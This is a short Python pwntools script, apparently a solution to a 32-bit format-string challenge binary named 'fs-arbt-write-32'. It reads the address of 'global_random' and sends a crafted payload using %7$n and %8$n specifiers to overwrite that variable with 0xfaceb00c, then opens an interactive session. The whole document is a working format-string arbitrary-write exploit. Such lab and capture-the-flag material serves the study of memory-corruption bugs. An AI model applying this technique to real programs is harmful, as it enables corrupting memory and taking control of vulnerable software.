#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-write-32")

gr_addr = p.elf.symbols['global_random']

print(hex(gr_addr))

print(p.recv())

# 0xfaceb00c
first = 0xb00c - 8
second = 0xface - 0xb00c

p.sendline(p32(gr_addr) + p32(gr_addr+2) + '%' + ("%dx" % first) + "%7$n" + "%" + ("%dx" % second) +"%8$n")

print(p.recv())

p.interactive()
